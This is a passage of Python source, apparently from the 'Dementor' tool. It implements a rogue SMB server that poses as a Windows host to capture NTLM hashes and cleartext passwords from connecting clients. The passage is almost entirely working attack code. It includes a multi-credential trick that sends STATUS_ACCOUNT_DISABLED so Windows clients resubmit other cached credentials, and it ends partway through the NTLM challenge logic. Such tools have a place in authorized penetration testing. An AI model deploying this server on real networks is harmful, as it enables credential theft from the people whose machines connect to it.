# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: basic
import uuid
import secrets
import typing

from typing_extensions import override

from impacket.smbserver import TypesMech, MechTypes
from scapy.fields import NetBIOSNameField
from impacket import (
    nmb,
    ntlm,
    smb,
    nt_errors,
    smb3,
    smb3structs as smb2,
    spnego,
    smbserver,
)
from caterpillar.py import (
    LittleEndian,
    f,
    struct,
    struct_factory,
    this,
    uint16,
)
from caterpillar.types import uint16_t

from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.session import SessionConfig
from dementor.config.util import is_true
from dementor.loader import BaseProtocolModule, DEFAULT_ATTR
from dementor.log.logger import ProtocolLogger, dm_logger
from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    NTLM_AUTH_extract_client_fields,
    NTLM_TRANSPORT_CLEARTEXT,
    NTLM_TRANSPORT_RAW,
    NTLM_new_timestamp,
    NTLM_report_auth,
    NTLM_report_raw_fields,
    ATTR_NTLM_CHALLENGE,
    ATTR_NTLM_DISABLE_ESS,
    ATTR_NTLM_DISABLE_NTLMV2,
    ATTR_NTLM_TARGET_TYPE,
    ATTR_NTLM_VERSION,
    ATTR_NTLM_NB_COMPUTER,
    ATTR_NTLM_NB_DOMAIN,
    ATTR_NTLM_DNS_COMPUTER,
    ATTR_NTLM_DNS_DOMAIN,
    ATTR_NTLM_DNS_TREE,
)
from dementor.protocols.spnego import (
    NEG_STATE_ACCEPT_INCOMPLETE,
    NEG_STATE_REJECT,
    SPNEGO_NTLMSSP_MECH,
    build_neg_token_init,
    build_neg_token_resp,
)
from dementor.servers import (
    BaseProtoHandler,
    ThreadingTCPServer,
    ServerThread,
    BaseServerThread,
)

__proto__ = ["SMB"]

# --- Helpers -----------------------------------------------------------------


def _split_smb_strings(data: bytes, is_unicode: bool) -> list[str]:
    r"""Split concatenated null-terminated SMB strings from raw bytes.

    Encoding is determined by FLAGS2_UNICODE (passed as *is_unicode*):

    * **ASCII** (``is_unicode=False``): each string is terminated by a
      single ``\x00``.  Decoded as ASCII with replacement.
      Per [MS-CIFS] §2.2.1.1 (OEM_STRING).
    * **UTF-16LE** (``is_unicode=True``): each string is terminated by
      ``\x00\x00`` at a 2-byte aligned offset from the segment start.
      Simple ``split(b"\x00\x00")`` is wrong because ``\x00`` can appear
      within a valid UTF-16LE code unit at an odd offset.
      Per [MS-CIFS] §2.2.1.1 (UNICODE_STRING).

    :param data: Raw concatenated null-terminated strings
    :param is_unicode: True when FLAGS2_UNICODE is set
    :return: List of decoded strings
    """
    if not data:
        return []

    if not is_unicode:
        # [MS-CIFS] §2.2.1.1: OEM_STRING — single \x00 terminator
        return [s.decode("ascii", errors="replace") for s in data.split(b"\x00") if s]

    # [MS-CIFS] §2.2.1.1: UNICODE_STRING — \x00\x00 at 2-byte aligned offsets
    segments: list[str] = []
    start = 0
    i = 0
    while i < len(data) - 1:
        if data[i] == 0 and data[i + 1] == 0 and (i - start) % 2 == 0:
            if i > start:
                segments.append(data[start:i].decode("utf-16-le", errors="replace"))
            start = i + 2
            i = start
        else:
            i += 1
    # Trailing segment without null terminator
    if start < len(data) and len(data) - start >= 2:
        trailing = data[start:].rstrip(b"\x00")
        if trailing:
            segments.append(trailing.decode("utf-16-le", errors="replace"))
    return segments


# --- Constants ---------------------------------------------------------------
SMB2_DIALECTS = {
    smb2.SMB2_DIALECT_002: "SMB 2.002",
    smb2.SMB2_DIALECT_21: "SMB 2.1",
    smb2.SMB2_DIALECT_WILDCARD: "SMB 2.???",
    smb2.SMB2_DIALECT_30: "SMB 3.0",
    smb2.SMB2_DIALECT_302: "SMB 3.0.2",
    smb2.SMB2_DIALECT_311: "SMB 3.1.1",
}

SMB2_NEGOTIABLE_DIALECTS = set(SMB2_DIALECTS) - {smb2.SMB2_DIALECT_WILDCARD}

SMB2_DIALECT_REV = {v: k for k, v in SMB2_DIALECTS.items()}

# [MS-SMB2] §2.2.3.1.1: SHA-512 hash algorithm ID = 0x0001
SMB2_INTEGRITY_SHA512 = uint16.to_bytes(0x0001, order=LittleEndian)

# String-to-hex mapping for SMB2 dialect config values
SMB2_DIALECT_STRINGS: dict[str, int] = {
    "2.002": smb2.SMB2_DIALECT_002,
    "2.1": smb2.SMB2_DIALECT_21,
    "3.0": smb2.SMB2_DIALECT_30,
    "3.0.2": smb2.SMB2_DIALECT_302,
    "3.1.1": smb2.SMB2_DIALECT_311,
}

# Realistic SMB2 server values per [MS-SMB2] §2.2.4 (Windows Server defaults)
# 8 MB for direct TCP (port 445) — matches Windows Server 2012+ behaviour
SMB2_MAX_TRANSACT_SIZE: int = 8_388_608
SMB2_MAX_READ_SIZE: int = 8_388_608
SMB2_MAX_WRITE_SIZE: int = 8_388_608

# Realistic SMB2 capabilities — [MS-SMB2] §2.2.4
# DFS(0x01) | Leasing(0x02) | LargeMTU(0x04) | MultiChannel(0x08)
# | DirectoryLeasing(0x20) = 0x2f
# We do NOT set Encryption(0x40) since we don't implement it.
SMB2_SERVER_CAPABILITIES: int = 0x2F

# Realistic SMB1 negotiate defaults per [MS-SMB] §2.2.4.5.2.1 <28> /
# [MS-CIFS] §2.2.4.52.2
SMB1_MAX_MPX_COUNT: int = 50
SMB1_MAX_BUFFER_SIZE: int = 16644

# STATUS_ACCOUNT_DISABLED — used for multi-credential SSPI retry
STATUS_ACCOUNT_DISABLED: int = 0xC0000072

# [MS-SMB2] §2.2.3.1.7: SMB2_SIGNING_CAPABILITIES negotiate context type
SMB2_SIGNING_CAPABILITIES_ID: int = 0x0008


# (missing in impacket struct definitions)
# [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
@struct(order=LittleEndian)
class SMB2SigningCapabilities(struct_factory.mixin):  # type: ignore[unsupported-base]
    SigningAlgorithmCount: uint16_t
    SigningAlgorithms: f[list[int], uint16[this.SigningAlgorithmCount]]


# --- Config ------------------------------------------------------------------
def parse_dialect(value: str | int) -> int:
    """Convert a dialect string (e.g. "3.1.1") to its hex constant.

    :param value: Dialect version as a string (e.g. "3.1.1") or integer hex constant
    :type value: str | int
    :raises ValueError: If the string is not a recognized SMB2 dialect
    :return: The SMB2 dialect hex constant
    :rtype: int
    """
    if isinstance(value, int):
        return value
    key = str(value).strip()
    if key not in SMB2_DIALECT_STRINGS:
        raise ValueError(
            f"Unknown SMB2 dialect {key!r}; valid: {', '.join(SMB2_DIALECT_STRINGS)}"
        )
    return SMB2_DIALECT_STRINGS[key]


class SMBServerConfig(TomlConfig):
    """Per-listener SMB server configuration loaded from TOML.

    Each ``[[SMB.Server]]`` entry in ``Dementor.toml`` produces one instance.
    Inherits shared NTLM settings (Challenge, DisableESS, DisableNTLMv2, and
    identity overrides) from the ``[NTLM]`` section via ``ATTR_NTLM_*``
    attributes with ``section_local=False``, enabling 4-level config resolution:
    per-server → ``[SMB]`` → ``[NTLM]`` → ``[Globals]``.
    """

    _section_ = "SMB"
    _fields_ = [
        # --- Transport & Protocol ---
        A("smb_port", "Port"),
        A("smb_enable_smb1", "EnableSMB1", True, factory=is_true),
        A("smb_enable_smb2", "EnableSMB2", True, factory=is_true),
        A("smb_allow_smb1_upgrade", "AllowSMB1Upgrade", True, factory=is_true),
        A("smb2_min_dialect", "SMB2MinDialect", "2.002", factory=parse_dialect),
        A("smb2_max_dialect", "SMB2MaxDialect", "3.1.1", factory=parse_dialect),
        # --- SMB Negotiate ---
        A("smb_force_smb1_plaintext", "ForceSMB1Plaintext", False, factory=is_true),
        # --- SMB Identity ---
        A("smb_nb_computer", "NetBIOSComputer", "DEMENTOR"),
        A("smb_nb_domain", "NetBIOSDomain", "WORKGROUP"),
        A("smb_server_os", "ServerOS", "Windows"),
        A("smb_native_lanman", "NativeLanMan", None),
        # --- Post-Auth ---
        A("smb_captures_per_connection", "CapturesPerConnection", 2, factory=int),
        A("smb_error_code", "ErrorCode", nt_errors.STATUS_SMB_BAD_UID),
        # --- NTLM Capture (shared, section_local=False) ---
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_DISABLE_ESS,
        ATTR_NTLM_DISABLE_NTLMV2,
        # --- NTLM Identity (shared, section_local=False) ---
        ATTR_NTLM_TARGET_TYPE,
        ATTR_NTLM_VERSION,
        ATTR_NTLM_NB_COMPUTER,
        ATTR_NTLM_NB_DOMAIN,
        ATTR_NTLM_DNS_COMPUTER,
        ATTR_NTLM_DNS_DOMAIN,
        ATTR_NTLM_DNS_TREE,
    ]

    if typing.TYPE_CHECKING:
        smb_port: int
        smb_enable_smb1: bool
        smb_enable_smb2: bool
        smb_allow_smb1_upgrade: bool
        smb2_min_dialect: int
        smb2_max_dialect: int
        smb_force_smb1_plaintext: bool
        smb_nb_computer: str
        smb_nb_domain: str
        smb_server_os: str
        smb_native_lanman: str | None
        smb_captures_per_connection: int
        smb_error_code: int
        ntlm_challenge: bytes
        ntlm_disable_ess: bool
        ntlm_disable_ntlmv2: bool
        ntlm_target_type: str
        ntlm_version: bytes
        ntlm_nb_computer: str | None
        ntlm_nb_domain: str | None
        ntlm_dns_computer: str | None
        ntlm_dns_domain: str | None
        ntlm_dns_tree: str | None

    @property
    def effective_native_lanman(self) -> str:
        """NativeLanMan defaults to ServerOS when not explicitly set.

        :return: The effective NativeLanMan string for SMB negotiate responses
        :rtype: str
        """
        return self.smb_native_lanman or self.smb_server_os

    def set_smb_error_code(self, value: str | int) -> None:
        """Set the SMB error code from an integer or nt_errors attribute name.

        Falls back to STATUS_SMB_BAD_UID if the string does not match any
        known nt_errors constant.

        :param value: NTSTATUS code as an integer or attribute name string
            (e.g. "STATUS_ACCESS_DENIED")
        :type value: str | int
        """
        if isinstance(value, int):
            self.smb_error_code = value
        else:
            try:
                self.smb_error_code = getattr(nt_errors, str(value))
            except AttributeError:
                dm_logger.error(
                    f"Invalid SMB error code: {value} - using default: STATUS_SMB_BAD_UID"
                )
                self.smb_error_code = nt_errors.STATUS_SMB_BAD_UID


class SMB(BaseProtocolModule[SMBServerConfig]):
    name: str = "SMB"
    config_ty = SMBServerConfig
    config_attr = DEFAULT_ATTR
    config_enabled_attr = DEFAULT_ATTR
    config_list = True

    @override
    def create_server_thread(
        self, session: SessionConfig, server_config: SMBServerConfig
    ) -> BaseServerThread[SMBServerConfig]:
        return ServerThread(
            session,
            server_config,
            SMBServer,
            include_server_config=True,
            server_address=(
                session.bind_address,
                server_config.smb_port,
            ),
        )


# --- Utilities ---------------------------------------------------------------
def get_server_time() -> int:
    """Return current UTC time as a Windows FILETIME for SMB timestamps.

    :return: Current UTC time encoded as a 64-bit Windows FILETIME value
    :rtype: int
    """
    return NTLM_new_timestamp()


def get_command_name(command: int, smb_version: int) -> str:
    """Map an SMB command opcode to its human-readable name.

    Searches the ``smb.SMB`` constants (for SMBv1) or ``smb2`` module
    constants (for SMBv2) to find the symbolic name matching the opcode.

    :param command: The SMB command opcode to look up
    :type command: int
    :param smb_version: SMB protocol version (``0x01`` for SMB1, ``0x02`` for SMB2)
    :type smb_version: int
    :return: The symbolic command name (e.g. "SMB_COM_NEGOTIATE"), or "Unknown"
    :rtype: str
    """
    match smb_version:
        case 0x01:
            for key, value in vars(smb.SMB).items():
                if key.startswith("SMB_COM") and value == command:
                    return key

        case 0x02:
            if 0 <= command < 0x13:
                for key, value in vars(smb2).items():
                    if key.startswith("SMB2_") and value == command:
                        return key
        case _:
            pass

    return "Unknown"


# --- Handler -----------------------------------------------------------------
class SMBHandler(BaseProtoHandler):
    """Per-connection SMB protocol handler for NTLM credential capture.

    Implements both SMB1 and SMB2/3 protocol paths as an auth-capture scaffold:
    negotiates the protocol, runs the NTLMSSP exchange to extract crackable
    hashes, optionally retries for multi-credential capture, then drops the
    connection. Supports extended security (SPNEGO/NTLMSSP), basic security
    (raw challenge/response), and cleartext password capture.

    Command dispatch is table-driven via :attr:`smb1_commands` and
    :attr:`smb2_commands` dicts populated in :meth:`__init__`.
    """

    STATE_NEGOTIATE = 0
    STATE_AUTH = 1

    # -- Connection lifecycle --

    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
        request: typing.Any,
        client_address: tuple[str, int],
        server: typing.Any,
    ) -> None:
        """Initialize the SMB protocol handler for a single client connection.

        Sets up per-connection state including SMB1/SMB2 session tracking,
        authentication counters, and command dispatch tables. Delegates to
        :class:`BaseProtoHandler` for transport setup.

        :param config: The active session configuration
        :type config: SessionConfig
        :param server_config: SMB-specific server configuration from TOML
        :type server_config: SMBServerConfig
        :param request: The raw socket/request object from the TCP server
        :type request: typing.Any
        :param client_address: The ``(host, port)`` tuple of the connecting client
        :type client_address: tuple[str, int]
        :param server: The parent :class:`SMBServer` instance
        :type server: typing.Any
        """
        self.authenticated = False
        self.smb_config = server_config

        # Per-connection state
        self.smb1_extended_security: bool = True
        self.smb1_challenge: bytes = server_config.ntlm_challenge
        self.smb1_negotiate_encrypt: bool = True
        # Server-assigned user ID for this SMB1 session. Allocated on
        # first session setup; 0 means no session yet. Clients echo this
        # in subsequent requests to identify their session.
        # [MS-SMB] §3.3.5.3
        self.smb1_uid: int = 0
        # Server-assigned session ID for this SMB2 session. Allocated on
        # first session setup; 0 means no session yet. Must never be 0
        # or -1 in responses after allocation. [MS-SMB2] §3.3.5.5.1
        self.smb2_session_id: int = 0
        # Tracks how many credential captures have occurred on this
        # connection. Used to implement multi-credential capture: after
        # each capture (except the last), the server returns
        # STATUS_ACCOUNT_DISABLED to trick Windows SSPI into retrying
        # with a different cached credential.
        self.auth_attempt_count: int = 0
        # Accumulated client info from all messages (NEGOTIATE, SESSION_SETUP,
        # AUTHENTICATE). Emitted as a single display line after auth completes.
        self.client_info: dict[str, str] = {}

        self.smb1_commands: dict[int, typing.Any] = {
            smb.SMB.SMB_COM_NEGOTIATE: self.handle_smb1_negotiate,
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX: self.handle_smb1_session_setup,
            smb.SMB.SMB_COM_TREE_CONNECT_ANDX: self.handle_smb1_tree_connect,
            smb.SMB.SMB_COM_LOGOFF_ANDX: self.handle_smb1_logoff,
        }
        self.smb2_commands: dict[int, typing.Any] = {
            smb2.SMB2_NEGOTIATE: self.handle_smb2_negotiate,
            smb2.SMB2_SESSION_SETUP: self.handle_smb2_session_setup,
            smb2.SMB2_LOGOFF: self.handle_smb2_logoff,
            smb2.SMB2_TREE_CONNECT: self.handle_smb2_tree_connect,
        }
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        """Create a protocol-specific logger with SMB metadata.

        :return: A logger instance tagged with protocol name, color, host, and port
        :rtype: ProtocolLogger
        """
        return ProtocolLogger(
            extra={
                "protocol": "SMB",
                "protocol_color": "light_goldenrod1",
                "host": self.client_host,
                "port": self.smb_config.smb_port,
            }
        )

    def setup(self) -> None:
        """Log the incoming client connection at debug level."""
        self.logger.debug(f"Incoming connection from {self.client_host}")

    def finish(self) -> None:
        """Emit accumulated SMB client info and log connection closure."""
        self._emit_smb_client_info()
        self.logger.debug(f"Connection to {self.client_host} closed")

    # -- Transport --

    def send_data(self, payload: bytes, ty: int | None = None) -> None:
        """Wrap payload in a NetBIOS session packet and send it to the client.

        :param payload: The raw bytes to send as the NetBIOS trailer
        :type payload: bytes
        :param ty: NetBIOS session packet type, defaults to NETBIOS_SESSION_MESSAGE
        :type ty: int | None, optional
        """
        packet = nmb.NetBIOSSessionPacket()
        packet.set_type(ty or nmb.NETBIOS_SESSION_MESSAGE)
        packet.set_trailer(payload)
        self.send(packet.rawData())

    def send_smb1_command(
        self,
        command: int,
        data: object,
        parameters: object,
        packet: smb.NewSMBPacket,
        error_code: int | None = None,
    ) -> None:
        """Build and send an SMB1 response wrapped in a NetBIOS session packet.

        Constructs the full SMB1 response header with correct Flags1
        (reply bit), Flags2 (mode-aware: EXTENDED_SECURITY only set when
        the connection negotiated extended security), echoed PID/TID/MID,
        the server-assigned Uid, and the NTSTATUS error code split into
        the legacy ErrorClass/Reserved/ErrorCode fields.

        Spec: [MS-CIFS] §2.2.3.1 (SMB header), [MS-SMB] §2.2.3.1 (Flags2)

        :param command: The SMB1 command code (e.g. ``smb.SMB.SMB_COM_NEGOTIATE``)
        :type command: int
        :param data: The SMB command data portion (SMBCommand Data field)
        :type data: object
        :param parameters: The SMB command parameters portion (SMBCommand Parameters field)
        :type parameters: object
        :param packet: The original client request packet, used to echo PID/TID/MID
        :type packet: smb.NewSMBPacket
        :param error_code: NTSTATUS error code for the response, defaults to None (success)
        :type error_code: int | None, optional
        """
        resp = smb.NewSMBPacket()
        # [MS-CIFS] §2.2.3.1: SMB_FLAGS_REPLY (0x80) on server responses
        resp["Flags1"] = smb.SMB.FLAGS1_REPLY

        # Flags2 depends on security mode — [MS-SMB] §2.2.3.1
        flags2 = (
            smb.SMB.FLAGS2_NT_STATUS
            | smb.SMB.FLAGS2_LONG_NAMES
            | (packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
        )
        if self.smb1_extended_security:
            flags2 |= smb.SMB.FLAGS2_EXTENDED_SECURITY
        resp["Flags2"] = flags2

        resp["Pid"] = packet["Pid"]
        resp["Tid"] = packet["Tid"]
        resp["Mid"] = packet["Mid"]
        # Server-assigned session UID — [MS-SMB] §3.3.5.3
        if self.smb1_uid:
            resp["Uid"] = self.smb1_uid
        if error_code:
            resp["ErrorCode"] = error_code >> 16
            resp["_reserved"] = error_code >> 8 & 0xFF
            resp["ErrorClass"] = error_code & 0xFF

        cmd = smb.SMBCommand(command)
        cmd["Data"] = data
        cmd["Parameters"] = parameters
        resp.addCommand(cmd)

        self.send_data(resp.getData())

    def send_smb2_command(
        self,
        command_data: bytes,
        packet: typing.Any | None = None,
        command: int | None = None,
        status: int | None = None,
    ) -> None:
        """Build and send an SMB2 response wrapped in a NetBIOS session packet.

        Constructs the full SMB2 header with the server-to-client flag,
        NTSTATUS code, echoed command/credit/message fields, and the
        server-assigned SessionID. When no request packet is provided
        (e.g., for unsolicited NEGOTIATE responses), uses safe defaults.

        Spec: [MS-SMB2] §2.2.1 (SMB2 header), [MS-SMB2] §3.3.5.5.1 (SessionID)

        :param command_data: The serialized SMB2 command response body
        :type command_data: bytes
        :param packet: The original client request packet for echoing fields,
            defaults to None (uses safe defaults)
        :type packet: typing.Any | None, optional
        :param command: SMB2 command opcode override when *packet* is None,
            defaults to None
        :type command: int | None, optional
        :param status: NTSTATUS code for the response, defaults to None
            (STATUS_SUCCESS)
        :type status: int | None, optional
        """
        resp = smb2.SMB2Packet()
        # [MS-SMB2] §2.2.1: SMB2_FLAGS_SERVER_TO_REDIR (0x01) on responses
        resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR
        # [MS-SMB2] §2.2.1: NTSTATUS code
        resp["Status"] = status or nt_errors.STATUS_SUCCESS

        if packet is None:
            packet = {
                "Command": command or 0,
                "CreditCharge": 0,
                "Reserved": 0,
                "MessageID": 0,
                # [MS-SMB2] §2.2.1: TreeId MUST be 0 for NEGOTIATE
                "TreeID": 0,
            }
        resp["Command"] = packet["Command"]
        resp["CreditCharge"] = packet["CreditCharge"]
        resp["Reserved"] = packet["Reserved"]
        # Server-assigned SessionID — [MS-SMB2] §3.3.5.5.1
        resp["SessionID"] = self.smb2_session_id
        resp["MessageID"] = packet["MessageID"]
        resp["TreeID"] = packet["TreeID"]
        resp["CreditRequestResponse"] = 1
        resp["Data"] = command_data
        self.send_data(resp.getData())

    # -- Dispatch --

    def handle_data(self, data: bytes | None, transport: typing.Any) -> None:
        """Main connection loop: receive, decode, and dispatch SMB packets.

        Each TCP connection is wrapped in NetBIOS session framing (RFC 1002).
        This loop reads NetBIOS packets, handles session requests (port 139),
        discards keep-alives, then extracts the SMB payload. The first byte
        of the payload determines the SMB version:
          0xFF = SMB1 ([MS-SMB])
          0xFE = SMB2/3 ([MS-SMB2])
        and the packet is dispatched to the appropriate command handler via
        :meth:`handle_smb_packet`. EnableSMB1/EnableSMB2 config gates each path.

        :param data: Initial data from the connection (unused; data is read in the loop)
        :type data: bytes | None
        :param transport: The transport layer context (unused; kept for interface compatibility)
        :type transport: typing.Any
        """
        while True:
            data = self.recv(8192)
            if not data:
                break

            packet = nmb.NetBIOSSessionPacket(data)
            if packet.get_type() == nmb.NETBIOS_SESSION_KEEP_ALIVE:
                self.logger.debug("<NETBIOS_SESSION_KEEP_ALIVE>", is_client=True)
                continue

            if packet.get_type() == nmb.NETBIOS_SESSION_REQUEST:
                try:
                    _, remote, caller = packet.get_trailer().split(b" ")
                    field = NetBIOSNameField("caller", b"<invalid>")
                    called_name = field.m2i(None, b"\x20" + remote[:-2]).decode(
                        errors="replace"
                    )
                    calling_name = field.m2i(None, b"\x20" + caller[:-2]).decode(
                        errors="replace"
                    )
                    self.logger.debug(
                        f"<NETBIOS_SESSION_REQUEST> {calling_name} -> {called_name}",
                        is_client=True,
                    )
                    if calling_name:
                        self.client_info["calling"] = calling_name.rstrip()
                    if called_name:
                        self.client_info["called"] = called_name.rstrip()
                except ValueError:
                    pass
                self.send_data(b"\x00", nmb.NETBIOS_SESSION_POSITIVE_RESPONSE)
                continue

            raw_smb_data = packet.get_trailer()
            if len(raw_smb_data) == 0:
                self.logger.debug("Received empty SMB packet")
                continue

            cfg = self.smb_config
            smbv1 = False
            match raw_smb_data[0]:
                case 0xFF:  # SMB1
                    if not cfg.smb_enable_smb1:
                        self.logger.debug("SMB1 disabled, dropping")
                        break
                    packet = smb.NewSMBPacket(data=raw_smb_data)
                    smbv1 = True
                case 0xFE:  # SMB2/SMB3
                    if not cfg.smb_enable_smb2:
                        self.logger.debug("SMB2 disabled, dropping")
                        break
                    packet = smb2.SMB2Packet(data=raw_smb_data)
                case _:
                    self.logger.debug(f"Unknown SMB packet type: {raw_smb_data[0]}")
                    break

            self.handle_smb_packet(packet, smbv1)

    def handle_smb_packet(self, packet: typing.Any, smbv1: bool = False) -> None:
        """Dispatch a parsed SMB packet to the registered command handler.

        Looks up the command opcode in the smb1_commands or smb2_commands
        dispatch table (populated in :meth:`__init__`) and calls the matching
        handler method. Unrecognized commands terminate the connection.

        :param packet: Parsed SMB packet (SMB1 or SMB2) from the client
        :type packet: typing.Any
        :param smbv1: Whether this is an SMB1 packet, defaults to False
        :type smbv1: bool, optional
        :raises BaseProtoHandler.TerminateConnection: If the command is not
            implemented or the handler raises it
        """
        command = packet["Command"]
        command_name = get_command_name(command, 1 if smbv1 else 2)
        title = f"SMBv{1 if smbv1 else 2} command {command_name} ({command:#04x})"
        handler_map = self.smb1_commands if smbv1 else self.smb2_commands
        handler = handler_map.get(command)
        if handler:
            try:
                handler(packet)
            except BaseProtoHandler.TerminateConnection:
                raise
            except Exception:
                self.logger.exception(f"Error in {title}")
        else:
            self.logger.fail(f"{title} not implemented")
            raise BaseProtoHandler.TerminateConnection

    # -- Logging --

    def _emit_smb_client_info(self) -> None:
        """Emit a single display line with accumulated SMB-layer client info.

        Called once per connection after all SMB fields have been collected.
        Includes: NativeOS, NativeLanMan, CallingName, CalledName,
        AccountName, PrimaryDomain, tree connect Path.
        """
        keys = [
            ("smb_os", "os"),
            ("smb_lanman", "lanman"),
            ("calling", "calling"),
            ("called", "called"),
            ("account", "account"),
            ("smb_domain", "domain"),
            ("path", "path"),
        ]
        parts = [
            f"{label}:{self.client_info[k]}" for k, label in keys if k in self.client_info
        ]
        if parts:
            self.logger.display(f"SMB: {' | '.join(parts)}")

    def log_client(self, msg: str, command: str | None = None) -> None:
        """Log a debug message attributed to the client.

        :param msg: The message text to log
        :type msg: str
        :param command: Optional command name to prefix the message with, defaults to None
        :type command: str | None, optional
        """
        self.log(msg, command, is_client=True)

    def log_server(self, msg: str, command: str | None = None) -> None:
        """Log a debug message attributed to the server.

        :param msg: The message text to log
        :type msg: str
        :param command: Optional command name to prefix the message with, defaults to None
        :type command: str | None, optional
        """
        self.log(msg, command, is_server=True)

    def log(
        self,
        msg: str,
        command: str | None = None,
        is_server: bool = False,
        is_client: bool = False,
    ) -> None:
        """Log a debug message with optional command prefix and direction tag.

        When *command* is provided, the message is prefixed with
        ``<command> ``. The *is_server* and *is_client* flags control
        the directional tag in the log output.

        :param msg: The message text to log
        :type msg: str
        :param command: Optional command name to prefix the message with, defaults to None
        :type command: str | None, optional
        :param is_server: Tag this message as server-originated, defaults to False
        :type is_server: bool, optional
        :param is_client: Tag this message as client-originated, defaults to False
        :type is_client: bool, optional
        """
        if command:
            msg = f"<{command}> {msg}"
        self.logger.debug(msg, is_server=is_server, is_client=is_client)

    # -- NTLMSSP exchange --

    def handle_ntlmssp(
        self,
        token: bytes,
        command_name: str = "SMB2_SESSION_SETUP",
    ) -> tuple[bytes, int]:
        """Handle the NTLMSSP 3-message authentication exchange.

        NTLM authentication over SMB uses a 3-message handshake:
          1. Client sends NEGOTIATE_MESSAGE (flags, version hints)
          2. Server replies with CHALLENGE_MESSAGE (8-byte nonce, AV_PAIRs)
          3. Client sends AUTHENTICATE_MESSAGE (hashed credentials)

        The token may be wrapped in SPNEGO/GSSAPI (tags 0x60/0xA1) or
        sent as raw NTLMSSP. This method unwraps SPNEGO if present, then
        dispatches based on the NTLM message type byte at offset 8.

        On the first call, allocates both SMB1 Uid and SMB2 SessionID
        for this connection. After capturing credentials from the
        AUTHENTICATE_MESSAGE, returns either STATUS_ACCOUNT_DISABLED
        (to trigger a retry with different credentials) or the final
        configured error code.

        :param token: Raw security token from the SMB session setup request
        :type token: bytes
        :param command_name: SMB command name for log attribution, defaults to
            "SMB2_SESSION_SETUP"
        :type command_name: str, optional
        :raises BaseProtoHandler.TerminateConnection: If the GSSAPI token is
            malformed, the NTLM token length is invalid, an unsupported
            NTLM message type is received, or a CHALLENGE_MESSAGE arrives
            unexpectedly
        :return: Tuple of (response_token_bytes, ntstatus_error_code)
        :rtype: tuple[bytes, int]
        """
        is_gssapi = not token.startswith(b"NTLMSSP")

        # Allocate session IDs on first session setup
        if self.smb2_session_id == 0:
            # [MS-SMB2] §3.3.5.5.1: MUST NOT be 0 or -1
            self.smb2_session_id = secrets.randbelow(0xFFFFFFFFFFFFFFFE) + 1
        if self.smb1_uid == 0:
            # [MS-SMB] §3.3.5.3: unique UID, 1..0xFFFF
            self.smb1_uid = secrets.randbelow(0xFFFE) + 1

        match token[0]:
            case 0x60:  # [RFC4178] §4.2.1 / [MS-SPNG]: ASN.1 APPLICATION[0]
                self.log_client("GSSAPI negTokenInit", command_name)
                try:
                    neg_token = spnego.SPNEGO_NegTokenInit(data=token)
                except Exception as e:
                    self.logger.debug(f"Invalid GSSAPI token: {e}")
                    raise BaseProtoHandler.TerminateConnection from None

                mech_type = neg_token["MechTypes"][0]
                if mech_type != TypesMech[SPNEGO_NTLMSSP_MECH]:
                    name = MechTypes.get(mech_type, "<unknown>")
                    self.logger.fail(
                        f"<{command_name}> Unsupported mechanism: "
                        f"{name} ({mech_type.hex()})"
                    )
                    resp = build_neg_token_resp(
                        NEG_STATE_REJECT,
                        supported_mech=SPNEGO_NTLMSSP_MECH,
                    )
                    return (
                        resp.getData(),
                        nt_errors.STATUS_MORE_PROCESSING_REQUIRED,
                    )
                token = neg_token["MechToken"]

            case 0xA1:  # [RFC4178] §4.2.2 / [MS-SPNG]: ASN.1 CONTEXT[1]
                self.log_client("GSSAPI negTokenArg", command_name)
                try:
                    neg_token = spnego.SPNEGO_NegTokenResp(data=token)
                except Exception as e:
                    self.logger.debug(f"Invalid GSSAPI token: {e}")
                    raise BaseProtoHandler.TerminateConnection from None
                token = neg_token["ResponseToken"]

        if len(token) <= 8:
            self.logger.fail(f"<{command_name}> Invalid NTLM token length: {len(token)}")
            raise BaseProtoHandler.TerminateConnection

        cfg = self.smb_config
        error_code = cfg.smb_error_code

        match token[8]:
            case 0x01:  # [MS-NLMP] §2.2.1.1: NEGOTIATE_MESSAGE
                negotiate = ntlm.NTLMAuthNegotiate()
                negotiate.fromString(token)
                if not is_gssapi:
                    self.log_client("NTLMSSP_NEGOTIATE_MESSAGE", command_name)

                # Accumulate client info from NEGOTIATE for consolidated display
                try:
                    self.client_info.update(
                        NTLM_AUTH_extract_client_fields(negotiate, is_negotiate=True)
                    )
                    client_flags: int = negotiate["flags"]
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP NegotiateFlags: 0x{client_flags:08x}",
                        is_client=True,
                    )
                except Exception:
                    self.logger.debug(
                        "Failed to extract NTLMSSP negotiate client info",
                    )

                # Resolve NTLM identity: NTLM overrides → SMB defaults
                nb_computer = cfg.ntlm_nb_computer or cfg.smb_nb_computer
                nb_domain = cfg.ntlm_nb_domain or cfg.smb_nb_domain
                dns_domain = cfg.ntlm_dns_domain or cfg.smb_nb_domain
                dns_computer = cfg.ntlm_dns_computer or (
                    f"{nb_computer}.{dns_domain}"
                    if dns_domain not in ("", "WORKGROUP")
                    else nb_computer
                )
